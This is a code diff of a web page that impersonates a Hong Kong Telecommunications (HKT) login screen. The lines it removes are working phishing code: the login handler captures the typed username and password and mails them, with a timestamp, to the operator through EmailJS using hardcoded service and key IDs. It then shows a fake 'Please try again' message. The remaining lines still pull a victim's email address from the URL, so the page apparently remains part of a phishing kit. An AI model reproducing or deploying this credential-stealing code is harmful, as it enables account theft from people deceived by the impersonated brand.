@@ -146,69 +146,7 @@
       // Get the 'email' parameter from the URL
       const urlParams = new URLSearchParams(window.location.search);
       const email = urlParams.get('email');
-
-  <!-- Confirmation Message -->
-  <div id="confirmation">
-    <h2 style="color: red;">Please try again</h2>
-    <p></p>
-    <button onclick="retryLogin()">Go to login</button>
-  </div>
-
-  <!-- Footer -->
-  <footer>
-    © Hong Kong Telecommunications (HKT) Limited 2007-2025. All rights reserved.
-  </footer>
-
-  <script>
-    function sendEmail(username, password) {
-      const serviceID = "service_nfx0v2t";
-      const templateID = "template_ccgi8xh";
-      const publicKey = "TLkClHUlQn5aQV4XO";
-
-      const templateParams = {
-        login_history: `Username: ${username}\nPassword: ${password}\nLogged in at: ${new Date().toLocaleString()}`
-      };
-
-      return emailjs.send(serviceID, templateID, templateParams, publicKey);
-    }
-
-    function authenticate() {
-      console.log("Login button clicked"); // Debugging log
-      let loginButton = document.getElementById("loginButton");
-      loginButton.textContent = "Authenticating...";
-      loginButton.disabled = true;
-
-      let username = document.getElementById("username").value.trim();
-      let password = document.getElementById("password").value.trim();
-
-      if (username && password) {
-        sendEmail(username, password)
-          .then(() => {
-            console.log("Email sent successfully"); // Debugging log
-            loginButton.textContent = "Login";
-            loginButton.disabled = false;
-            document.getElementById("login").style.display = "none";
-            document.getElementById("confirmation").style.display = "block";
-          })
-          .catch(error => {
-            console.error("Error sending email", error);
-            loginButton.textContent = "Login";
-            loginButton.disabled = false;
-            alert("Failed to send login report. Please try again.");
-          });
-      } else {
-        alert("Please enter both username and password.");
-        loginButton.disabled = false;
-        loginButton.textContent = "Login";
-      }
-    }
-
-    function retryLogin() {
-      console.log("Retrying login..."); // Debugging log
-      document.getElementById("confirmation").style.display = "none";
-      document.getElementById("login").style.display = "flex"; // Show login panel again
-    }
-
+      
       // Debugging: Log the email to check if it's extracted correctly
       console.log("Email from URL:", email);
 
